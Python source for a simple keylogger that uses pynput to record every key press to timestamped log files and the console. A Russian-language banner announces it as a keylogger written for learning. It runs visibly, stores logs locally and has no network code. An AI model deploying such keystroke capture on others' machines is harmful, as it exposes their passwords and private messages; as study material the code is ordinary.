from pynput import keyboard
import logging
import zoneinfo # added since python 3.9
import datetime

logging.Formatter.converter = lambda *args: datetime.datetime.now(tz=zoneinfo.ZoneInfo("Europe/Moscow")).timetuple()
log_filepath = datetime.datetime.now().strftime('logs/log_%Y-%m-%d_%H-%M-%S.log')
handlers = [
  logging.FileHandler(log_filepath),
  logging.StreamHandler(),
]
logging.basicConfig(
  level=logging.INFO,
  format='[%(asctime)s] %(levelname)s [%(name)s] Key pressed %(message)s',
  datefmt='%Y-%m-%d %H:%M:%S %Z',
  handlers=handlers
)
logger = logging.getLogger(__name__)
logger.info(log_filepath)

hello_msg = f'''
********************************************************************
* Привет!                                                          *
* Эта программа собирает информацию о любом нажатии на клавиатуру. *
* Другими словами это простой Keylogger.                           *
* Эта версия поддерживает только Unix системы с python>=3.9.       *
* Программа создана в учебных целях.                               *
* Для завершения работы ESC или CTRL C.                            *
* История нажатий хранится в ./logs. Мануал в README.              *
********************************************************************
'''
exit_msg = '''
********************************************************************
*                                                                  *
*                                                                  *
*                    Завершение работы.                            *
*                    Результат в ./logs.                           *
*                                                                  *
*                                                                  *
********************************************************************
'''
logger.info(hello_msg)

def on_press(key):
  try:
    logger.info(f'{key.char}')
  except AttributeError:
    logger.info(f'{key}')

def on_release(key):
  if key == keyboard.Key.esc:
    return False

def main():
  try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
      listener.join()
  except:
    logger.info(exit_msg)
  else:
    logger.info(exit_msg)

if __name__ == '__main__':
  main()
